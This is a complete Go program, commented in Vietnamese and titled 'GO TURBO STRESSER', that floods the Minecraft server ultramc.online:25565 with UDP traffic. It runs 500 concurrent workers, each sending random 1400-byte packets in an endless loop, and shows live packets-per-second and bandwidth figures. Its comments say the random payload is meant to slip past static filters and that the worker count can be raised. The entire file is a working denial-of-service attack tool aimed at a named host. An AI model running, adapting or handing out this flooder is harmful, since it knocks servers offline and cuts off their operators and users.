package main

import (
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"sync/atomic"
	"time"
)

// --- CẤU HÌNH CỰC ĐỘ ---
const (
	TargetAddr = "ultramc.online:25565"
	PacketSize = 1400 // Kích thước tối ưu để tránh phân mảnh IP
	Workers    = 500  // Số lượng Goroutines chạy song song (Với 32GB RAM có thể tăng lên 2000+)
)

var ppsCounter uint64

func attack() {
	// Khởi tạo payload ngẫu nhiên để bypass các bộ lọc tĩnh
	payload := make([]byte, PacketSize)
	rand.Read(payload)

	// Tạo kết nối UDP
	conn, err := net.Dial("udp", TargetAddr)
	if err != nil {
		return
	}
	defer conn.Close()

	for {
		_, err := conn.Write(payload)
		if err == nil {
			atomic.AddUint64(&ppsCounter, 1)
		}
	}
}

func monitor() {
	var lastCount uint64
	for {
		time.Sleep(time.Second)
		currentCount := atomic.LoadUint64(&ppsCounter)
		pps := currentCount - lastCount
		lastCount = currentCount

		// Mbps = (Gói tin * Kích thước * 8 bit) / 1 triệu
		mbps := float64(pps*PacketSize*8) / 1000000
		fmt.Printf("\r[+] Trạng thái: %d PPS | Băng thông: %.2f Mbps", pps, mbps)
	}
}

func main() {
	// Sử dụng tối đa số nhân CPU hiện có
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("--- ⚡ GO TURBO STRESSER: %s ---\n", TargetAddr)
	fmt.Printf("Hệ thống: %d CPU | %d Workers\n", runtime.NumCPU(), Workers)

	// Chạy luồng giám sát
	go monitor()

	// Kích hoạt đội quân Workers
	for i := 0; i < Workers; i++ {
		go attack()
	}

	// Giữ chương trình chạy vô hạn
	select {}
}